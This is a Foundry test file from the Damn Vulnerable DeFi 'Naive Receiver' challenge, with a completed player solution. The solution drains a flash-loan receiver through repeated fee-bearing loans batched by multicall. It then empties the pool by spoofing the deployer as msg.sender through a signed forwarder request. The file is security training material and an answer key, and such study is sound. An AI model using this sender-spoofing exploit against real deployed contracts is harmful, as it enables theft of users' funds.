// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // 1st step - drain flashloan borrower
        // take flashloan from the pool so the borrower will pay the fee and the pool will its WETH balance (actually deployer)
        bytes[] memory flashLoanFunctionCallData = new bytes[](10);

        for (uint256 i = 0; i < 10; i++) {
            flashLoanFunctionCallData[i] = abi.encodeWithSelector(
                NaiveReceiverPool.flashLoan.selector,
                receiver,
                address(weth),
                WETH_IN_POOL,
                ""
            );
        }

        pool.multicall(flashLoanFunctionCallData);

        // 2nd step - drain pool
        // withdraw all WETH from the pool to the recovery account

        bytes[] memory withdrawFunctionCallData = new bytes[](1);

        // we call the withdraw function with two arguments
        // 1. amount to withdraw
        // 2. receiver address
        // 3. deployer address - this address becomes to msg.sender() in the withdraw function - last 20 bytes of the data
        withdrawFunctionCallData[0] = abi.encodeWithSelector(
            NaiveReceiverPool.withdraw.selector,
            WETH_IN_POOL + WETH_IN_RECEIVER,
            address(recovery),
            address(deployer) // this is the trick, we trick the pool to think that the deployer is the msg.sender
        );

        bytes memory withdrawMulticallData = abi.encodeWithSelector(
            Multicall.multicall.selector,
            withdrawFunctionCallData
        );

        // we need to forward the request to the pool so we can trick the pool to think that the deployer is the msg.sender
        BasicForwarder.Request memory withdrawRequest = BasicForwarder.Request({
            from: address(player),
            target: address(pool),
            value: 0,
            gas: 1000000,
            nonce: 0,
            data: withdrawMulticallData,
            deadline: block.timestamp + 1 hours
        });

        // These are straight forward things to create the signature and forward the request to the pool
        bytes32 requestHash = forwarder.getDataHash(withdrawRequest);

        // Manually construct the EIP-712 typed data hash
        bytes32 domainSeparator = forwarder.domainSeparator();
        bytes32 typedDataHash = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, requestHash)
        );

        // I want to sign the requestHash with the player's private key
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, typedDataHash);

        bytes memory playerSignature = abi.encodePacked(r, s, v);

        forwarder.execute(withdrawRequest, playerSignature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );

        // Pool is empty too
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );

        // All funds sent to recovery account
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }
}
